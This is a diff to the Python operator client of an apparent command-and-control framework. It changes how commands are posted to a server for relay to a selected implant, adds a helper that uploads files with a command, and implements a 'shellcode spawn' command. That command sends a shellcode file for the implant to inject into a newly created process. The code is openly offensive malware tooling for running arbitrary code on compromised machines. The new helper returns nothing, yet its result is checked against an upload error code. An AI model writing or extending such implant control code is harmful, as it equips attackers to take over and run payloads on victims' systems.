@@ -1,7 +1,9 @@
 import requests
+from os.path import isfile
 from typing import List
 from . import client_globals
 from . import client_errors
+from . import server_codes
 from . import storage
 from . import encryption
 
@@ -27,26 +29,59 @@ def update_implant_db():
 def print_success(cmd_id: str, args: List[str], app):
     app.get_child_by_id("command_output").print(f"The command \'{' '.join(args)}\' with ID {cmd_id} was successfully sent to implant \'{client_globals.instance_db.selected_implant}\'")
 
-# Helper function that sends just a command
+# Helper function that sends just a text command
 def post_command(cmd_str: str, cmd_type: storage.CMD_TYPE, cmd_id: str):
     
-    json_data = {
-                "username": client_globals.instance_db.operator_name,
-                "implant_name": client_globals.instance_db.selected_implant,
-                "cmd_type": cmd_type.value,
-                "command_id": cmd_id,
-                "arguments": cmd_str
+    x_headers = {
+                "X-Operator-Name": client_globals.instance_db.operator_name,
+                "X-Implant-Name": client_globals.instance_db.selected_implant,
+                "X-Command-Type": cmd_type.value,
+                "X-Command-Id": cmd_id,
     }
     
     url = "/admin/management"
+
+    cmd_struct = {"cmd_str": cmd_str}
 
     requests.post(client_globals.instance_db.server+
                          ":"+
                          client_globals.instance_db.port+
                          url,
-                         json=json_data
+                         headers=x_headers,
+                         data=cmd_struct
                          )
     return
+
+# Helper function that sends a file to the server as well as a command
+def post_file_command(file_path: str, file_id: str, cmd_str: str, cmd_type: storage.CMD_TYPE, cmd_id: str):
+    # Check if file exists, error if not
+    if not isfile(file_path):
+        raise client_errors.FileDoesntExist
+
+    # Build the request
+    x_headers = {
+                "X-Operator-Name": client_globals.instance_db.operator_name,
+                "X-Implant-Name": client_globals.instance_db.selected_implant,
+                "X-Command-Type": cmd_type.value,
+                "X-Command-Id": cmd_id,
+    }
+    
+    url = "/admin/management"
+
+    cmd_struct = {'cmd_str': cmd_str}
+
+    with open(file_path, "rb") as f:
+        # Send a request to the server with metadata for storage in headers,
+        # command string in the body, and attach the file as well
+        file_data = f.read()
+        requests.post(client_globals.instance_db.server+
+                             ":"+
+                             client_globals.instance_db.port+
+                             url,
+                             headers=x_headers,
+                             data=cmd_struct,
+                             files={'cmd_file': (file_id, file_data)}
+                            )
 
 # Command that selects an implant
 def cmd_select(args: List[str], app):
@@ -105,6 +140,31 @@ def cmd_shellcode_inject(args: List[str], app):
 # Different method of shellcode injection, this creates a process and injects it
 # into it, same client -> server -> implant transfer method as shellcode_inject
 def cmd_shellcode_spawn(args: List[str], app):
+    # Must be 2 args
+    client_errors.arg_len_error(args, 2, 2)
+
+    # Create a file id for the file to be saved
+    file_id = encryption.id_generator(N=32)
+
+    # Create a command id
+    cmd_id = encryption.id_generator(N=32)
+
+    # Create the command string
+    cmd_str = storage.create_command_str(cmd_id, storage.CMD_TYPE.CMD_SHELLCODE_SPAWN, [file_id]) 
+
+    # Post the file, if it doesn't exist, will raise FileDoesntExist exception
+    uploaded_filename = post_file_command(file_path=args[1],
+                                          file_id=file_id,
+                                          cmd_id=cmd_id,
+                                          cmd_type=storage.CMD_TYPE.CMD_SHELLCODE_SPAWN,
+                                          cmd_str=cmd_str
+                                          )
+    
+    # Check for server error on the return, raise a UploadFailure
+    if uploaded_filename == server_codes.ServerErrors.ERR_UPLOAD_EXCEPTION.value:
+        raise client_errors.UploadFailure 
+    
+    print_success(cmd_id=cmd_id, args=args, app=app)
     return
 
 # All associated server commands
